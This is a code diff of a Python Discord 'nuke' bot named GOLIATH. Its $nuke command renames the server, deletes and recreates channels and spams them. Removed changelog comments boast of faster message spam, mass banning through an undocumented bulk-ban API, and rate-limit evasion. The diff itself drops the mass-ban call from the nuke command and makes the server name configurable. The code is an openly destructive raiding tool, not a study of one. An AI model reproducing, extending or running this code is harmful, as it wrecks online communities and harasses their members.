@@ -1,14 +1,4 @@
-# changes made by Andrew are as follows:
-# Andrew replaced the 1 on 1 banning with the undocumented /bulk-ban.api
-# Andrew removed the dependency of requirements.txt
-# Andrew made the code much shorter by removing useless codes
-# Andrew improved the rate limit handling
-# Andrew made the message spam faster
-# Andrew improved how the GUI console terminal looks
-# Andrew made the overall code more efficient and optimized
-# Andrew made the bot automatically massban with the $nuke command instead of using a seperate command called $massban to massban
-# Andrew removed the ugly huge ASCII HIT texts and replaced it with more sleek and modern looking like alternative
-
+# ty andrew but dont yap
 import subprocess,sys
 for p in ['aiohttp','discord.py','pystyle','pyfiglet']:
  try:__import__(p if p!='discord.py' else 'discord')
@@ -28,6 +18,7 @@ EMBED_DESCRIPTION = "Desc here"
 EMBED_FOOTER = "Footer here"
 EMBED_THUMBNAIL = "https://cdn.discordapp.com/attachments/1327921469552070746/1338112843660394556/chudjak-chud.gif?ex=67ce2772&is=67ccd5f2&hm=396c1be63f785bdbf5bad1254a4db10c3ad23d5137ecb1d29de0da7bb056fcc6&"
 BAN_REASON = "Ur ban reason here"
+SERVER_NAME = "Ur server name here"
 
 def log(m,c=Colors.red):print(Colorate.Color(c,m,True))
 
@@ -43,7 +34,7 @@ async def on_ready():
 @GOLIATH.command()
 async def nuke(ctx):
     await ctx.message.delete()
-    try:await ctx.guild.edit(name="@GOLIATH Owns You!!")
+    try:await ctx.guild.edit(name=SERVER_NAME)
     except discord.Forbidden:
         await ctx.send("Missing permission to change guild name.",delete_after=5)
         log("Failed to change guild name.",Colors.red)
@@ -60,7 +51,6 @@ async def nuke(ctx):
             if isinstance(res,Exception):log(f"Failed to create channel {name}: {res}",Colors.red)
             else:log(f"Created channel {name}",Colors.green)
     await asyncio.gather(delete_channels(),create_channels())
-    await bulk_ban(ctx,BAN_REASON)
 
 @GOLIATH.event
 async def on_guild_channel_create(channel):
